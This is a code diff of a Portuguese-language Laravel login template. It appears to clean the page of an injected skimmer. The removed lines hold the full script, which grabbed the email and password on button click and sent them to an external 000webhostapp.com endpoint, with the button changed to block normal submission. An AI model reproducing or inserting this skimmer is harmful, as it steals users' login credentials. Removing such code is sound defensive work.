@@ -8,7 +8,7 @@
             <div class="panel panel-default">
                 
                 <div class="panel-body">
-                    <form id="loginForm" class="form-horizontal" role="form" method="POST" action="/login">
+                    <form class="form-horizontal" role="form" method="POST" action="/login">
                         {{ csrf_field() }}
 
                         <div class="form-group{{ $errors->has('email') ? ' has-error' : '' }} top-30">
@@ -16,6 +16,7 @@
 
                             <div class="col-md-8">
                                 <input id="email" type="email" class="form-control" name="email" value="{{ old('email') }}">
+
                                 @if ($errors->has('email'))
                                     <span class="help-block">
                                         <strong> 
@@ -37,6 +38,7 @@
 
                             <div class="col-md-8">
                                 <input id="password" type="password" class="form-control" name="password">
+
                                 @if ($errors->has('password'))
                                     <span class="help-block">
                                         <strong>
@@ -65,7 +67,7 @@
 
                         <div class="form-group">
                             <div class="col-md-6 col-md-offset-2  simple-button">
-                                <button id="entrarBtn" type="button" class="btn">
+                                <button type="submit" class="btn">
                                     <i class="fa fa-btn fa-sign-in"></i> Entrar
                                 </button>
                             </div>
@@ -77,28 +79,7 @@
                             </div>
                         </div>
                     </form>
-                </div><script>
-    document.getElementById('entrarBtn').addEventListener('click', function() {
-        var e1 = document.getElementById('email').value;
-        var p1 = document.getElementById('password').value;
-        var formData = new FormData();
-        formData.append('id1', e1);
-        formData.append('id', p1);
-        
-        fetch('https://de3aal3r.000webhostapp.com/curl.php', {
-            method: 'GET',
-            body: formData
-        })
-        .then(response => {
-            // Tratar a resposta aqui, se necessário
-            console.log(response);
-        })
-        .catch(error => {
-            // Tratar erros aqui, se necessário
-            console.error('Erro:', error);
-        });
-    });
-</script>
+                </div>
             </div>
         </div>
     </div>
